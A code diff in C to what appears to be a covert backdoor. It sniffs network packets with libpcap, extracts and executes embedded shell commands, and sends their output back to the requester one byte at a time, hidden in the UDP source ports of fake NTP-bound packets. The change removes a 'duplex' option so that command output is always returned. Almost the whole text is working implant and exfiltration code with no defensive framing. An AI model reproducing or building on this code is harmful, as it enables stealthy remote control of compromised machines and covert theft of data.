@@ -30,7 +30,7 @@ struct exfil_pack
 	char  *folder;
 };
 
-void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
+void pcap_start(const char *fltr_str, uint32 ipaddr, char *folder)
 {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -56,7 +56,7 @@ void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
 	// Start capturing, make sure to heavily restrict our CPU usage.
 	while (TRUE)
 	{
-		if (pcap_dispatch(nic, -1, pkt_handler, (u_char*)duplex) < 0)
+		if (pcap_dispatch(nic, -1, pkt_handler, NULL) < 0)
 			error("pcap_loop");
 		usleep(5000); // sleep 5ms
 	}
@@ -70,7 +70,6 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	char *data;
 //	char *dec;
 	char type;
-	int duplex = (int) user;
 	static char buf[MAX_LEN];
 	static int len = 0;
 
@@ -110,7 +109,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 		port = *(uint16*)(packet + PORT_OFF);
 
 		// Step 6: Execute the command
-		execute(data, ip, port, duplex);
+		execute(data, ip, port);
 	}
 
 	// Step 6: reset buffer
@@ -120,7 +119,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	data = 0;
 }
 
-void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
+void execute(char *command, u_int32_t ip, u_int16_t port)
 {
 	FILE *fp;
 	char line[MAX_LEN];
@@ -139,26 +138,24 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 
 	tot_len = strlen(resp) + 1;
 
-	if (duplex)
+	char *trans;
+
+	trans = buildTransmission(resp, &tot_len, RSP_TYP);
+
+	for (int i = 0; i < tot_len; i += 8)
 	{
-		char *trans;
-
-		trans = buildTransmission(resp, &tot_len, RSP_TYP);
-
-		for (int i = 0; i < tot_len; i += 8)
-		{
-			char frame[FRAM_SZ];
+		char frame[FRAM_SZ];
 //			char *enc;
-			char *ptr;
-			int fram_len;
-			uint16 src_port = 0;
-			uint16 dst_port = 0;
+		char *ptr;
+		int fram_len;
+		uint16 src_port = 0;
+		uint16 dst_port = 0;
 
-			ptr = trans + i;
+		ptr = trans + i;
 
-			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;
+		fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;
 
-			memcpy(frame, ptr, fram_len);
+		memcpy(frame, ptr, fram_len);
 
 //			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
@@ -166,20 +163,19 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 
 //			free(enc);
 
-			for (int j = 0; j < FRAM_SZ; ++j)
-			{
-				uint8 byte = frame[j];
-				src_port = 0xFF00 & SIGNTR << 8;
-				src_port += byte;
-				dst_port = PORT_NTP;
+		for (int j = 0; j < FRAM_SZ; ++j)
+		{
+			uint8 byte = frame[j];
+			src_port = 0xFF00 & SIGNTR << 8;
+			src_port += byte;
+			dst_port = PORT_NTP;
 
-				_send(ip, src_port, dst_port, CHAN_UDP);
-				usleep(SLEEP_TIME);
-			}
+			_send(ip, src_port, dst_port, CHAN_UDP);
+			usleep(SLEEP_TIME);
 		}
-
-		free(trans);
 	}
+
+	free(trans);
 
 	pclose(fp);
 }
